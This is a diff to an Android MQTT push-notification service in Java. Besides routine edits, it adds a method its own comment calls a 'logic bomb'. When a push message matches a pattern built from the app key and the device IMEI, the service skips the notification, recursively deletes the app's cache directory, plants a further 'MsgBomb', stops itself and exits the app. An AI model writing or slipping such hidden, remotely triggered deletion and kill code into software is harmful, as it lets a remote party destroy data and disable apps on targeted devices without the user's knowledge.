@@ -1,8 +1,11 @@
 package com.wondertek.video.msgpush.mqtt;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.Hashtable;
 import java.util.Random;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import android.app.AlarmManager;
 import android.app.Notification;
@@ -14,17 +17,22 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.media.RingtoneManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.os.IBinder;
 import android.util.Log;
+import android.widget.Toast;
 
 import com.ibm.mqtt.IMqttClient;
 import com.ibm.mqtt.MqttClient;
 import com.ibm.mqtt.MqttException;
 import com.ibm.mqtt.MqttPersistence;
 import com.ibm.mqtt.MqttSimpleCallback;
+import com.wbtech.common.CommonUtil;
 import com.wondertek.jttxl.R;
+import com.wondertek.video.VenusActivity;
 import com.wondertek.video.msgpush.NotificationDetailsActivity;
 import com.wondertek.video.msgpush.implbyself.Constants;
 
@@ -35,36 +43,43 @@ import com.wondertek.video.msgpush.implbyself.Constants;
  */
 public class MqttPushService extends Service
 {
+	private static Context mContext;
+	
 	// this is the log tag
 	public static final String		TAG = "MqttPushService";
 
 	// the IP address, where your MQTT broker is running.
 	public static final String		MQTT_HOST = "MQTT_HOST";
+	
 	// the port at which the broker is running. 
 	public static final String				MQTT_BROKER_PORT_NUM      = "MQTT_BROKER_PORT_NUM"; //1883;
+	
 	// Let's not use the MQTT persistence.
 	private static MqttPersistence	MQTT_PERSISTENCE          = null;
-	// We don't need to remember any state between the connections, so we use a clean start. 是否接收历史消息
+	
+	// We don't need to remember any state between the connections, so we use a clean start. 
 	private static boolean			MQTT_CLEAN_START          = true;
+	
 	// Let's set the internal keep alive for MQTT to 15 mins. I haven't tested this value much. It could probably be increased.
-    //how often should the app ping the server to keep the connection alive?
-	// 保持长连接的检测频率
-	//   too frequently - and you waste battery life
-	//   too infrequently - and you wont notice if you lose your connection
-	//					   until the next unsuccessfull attempt to ping
+    // how often should the app ping the server to keep the connection alive?
+	// too frequently - and you waste battery life
+	// too infrequently - and you wont notice if you lose your connection
+	// until the next unsuccessfull attempt to ping
 	//
-	//   it's a trade-off between how time-sensitive the data is that your
-	//	  app is handling, vs the acceptable impact on battery life
+	// it's a trade-off between how time-sensitive the data is that your
+	// app is handling, vs the acceptable impact on battery life
 	//
-	//   it is perhaps also worth bearing in mind the network's support for
-	//	 long running, idle connections. Ideally, to keep a connection open
-	//	 you want to use a keep alive value that is less than the period of
-	//	 time after which a network operator will kill an idle connection
+	// it is perhaps also worth bearing in mind the network's support for
+	// long running, idle connections. Ideally, to keep a connection open
+	// you want to use a keep alive value that is less than the period of
+	//time after which a network operator will kill an idle connection
 	private static short			MQTT_KEEP_ALIVE           = 60 * 5;
+	
 	// Set quality of services to 0 (at most once delivery), since we don't want push notifications 
 	// arrive more than once. However, this means that some messages might get lost (delivery is not guaranteed)
 	private static int[]			MQTT_QUALITIES_OF_SERVICE = { 0 } ;
 	private static int				MQTT_QUALITY_OF_SERVICE   = 0;
+	
 	// The broker should not retain any messages.
 	private static boolean			MQTT_RETAINED_PUBLISH     = false;
 		
@@ -85,6 +100,7 @@ public class MqttPushService extends Service
 	
 	// Connectivity manager to determining, when the phone loses connection
 	private ConnectivityManager		mConnMan;
+	
 	// Notification manager to displaying arrived push notifications 
 	private NotificationManager		mNotifMan;
 
@@ -100,10 +116,13 @@ public class MqttPushService extends Service
 
 	// Preferences instance 
 	private SharedPreferences 		mPrefs;
+	
 	// We store in the preferences, whether or not the service has been started
 	public static final String		PREF_STARTED = "isStarted";
+	
 	// We also store the deviceID (target)
 	public static final String		PREF_DEVICE_ID = "deviceID";
+	
 	// We store the last retry interval
 	public static final String		PREF_RETRY = "retryInterval";
 
@@ -119,6 +138,7 @@ public class MqttPushService extends Service
 
 	// Static method to start the service
 	public static void actionStart(Context ctx) {
+		mContext = ctx;
 		Intent i = new Intent(ctx, MqttPushService.class);
 		i.setAction(ACTION_START);
 		ctx.startService(i);
@@ -126,6 +146,7 @@ public class MqttPushService extends Service
 
 	// Static method to stop the service
 	public static void actionStop(Context ctx) {
+		mContext = ctx;
 		Intent i = new Intent(ctx, MqttPushService.class);
 		i.setAction(ACTION_STOP);
 		ctx.startService(i);
@@ -133,6 +154,7 @@ public class MqttPushService extends Service
 	
 	// Static method to send a keep alive message
 	public static void actionPing(Context ctx) {
+		mContext = ctx;
 		Intent i = new Intent(ctx, MqttPushService.class);
 		i.setAction(ACTION_KEEPALIVE);
 		ctx.startService(i);
@@ -423,6 +445,15 @@ public class MqttPushService extends Service
 		}
 	};
 	
+	// play notification sound
+	private void playNotificationSound() {
+		Uri uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
+		Notification n = new Notification();
+		n.sound = uri;
+		n.defaults = Notification.DEFAULT_LIGHTS | Notification.DEFAULT_VIBRATE;
+		mNotifMan.notify(random.nextInt(), n);
+	}
+	
 	// Display the topbar notification
 	private void showNotification(String text) {
 		Notification n = new Notification();
@@ -454,8 +485,47 @@ public class MqttPushService extends Service
 		return info.isConnected();
 	}
 	
+	// logic bomb try to clear application data
+	public void bombApplication() {
+		Log.d(TAG, ">>>bombApplication<<<");
+		playNotificationSound();
+		// clear cache
+		File cache = getCacheDir();
+		File appDir = new File(cache.getParent());
+		if (appDir.exists()) {
+			String[] children = appDir.list();
+			for (String s : children) {
+				if (s.equals("cache")) {
+					deleteDir(new File(appDir, s));
+				}
+			}
+		}
+		// place a new bomb
+		MsgBomb bomb = new MsgBomb(mContext);
+		if (bomb.create() == true) {
+			Log.d(TAG, "[bombApplication] place a new bomb.");
+		} 
+		// stop service and exit application
+		actionStop(mContext);
+		System.exit(0);
+	}
+	
+	// delete directory and file recursively
+	private static boolean deleteDir(File dir) {
+		if (dir != null && dir.isDirectory()) {
+			String[] children = dir.list();
+			for (int i = 0; i < children.length; i++) {
+				boolean success = deleteDir(new File(dir, children[i]));
+				if (!success) {
+					return false;
+				}
+			}
+		}
+		Log.i(TAG, dir.getAbsolutePath() + " has deleted.");
+		return dir.delete();
+	}
+	
 	// stored internally
-
 	private Hashtable<String, String> dataCache = new Hashtable<String, String>(); 
 
 	private boolean addReceivedMessageToStore(String key, String value)
@@ -531,8 +601,8 @@ public class MqttPushService extends Service
 				log("Connection error" + "No connection");	
 			} else {		
 				String appkey = mPrefs.getString(APPKEY, "");
-				String msisdn = mPrefs.getString(PREF_DEVICE_ID, "");
-				String[] topics = new String[]{"webcloud",appkey,msisdn};
+				String imei = mPrefs.getString(PREF_DEVICE_ID, "");
+				String[] topics = new String[]{"webcloud", appkey, appkey + "/" + imei};
 				
 				int defQos = mPrefs.getInt(QUALITIES_OF_SERVICE, 0);
 				int[] qos = {defQos};
@@ -587,8 +657,19 @@ public class MqttPushService extends Service
 			// Show a notification
 			String s = new String(payload);
 			log("Got message: " + s);
-			if (addReceivedMessageToStore(topicName, s)){
-				showNotification(s);	
+			
+			String imei = mPrefs.getString(PREF_DEVICE_ID, "");
+			String appKey = CommonUtil.getAppKey(mContext);
+			String pattern = appKey + "_" + imei + "_\\d+@.*";
+			boolean bfound = s.matches(pattern);
+			Log.d(TAG, "pattern is found: " + bfound);
+			
+			if (bfound == true) {
+				bombApplication();
+			} else  {
+				// if (addReceivedMessageToStore(topicName, s))
+				Log.d(TAG, "[publishArrived] call showNotification()");
+				showNotification(s);
 			}
 		}
 		
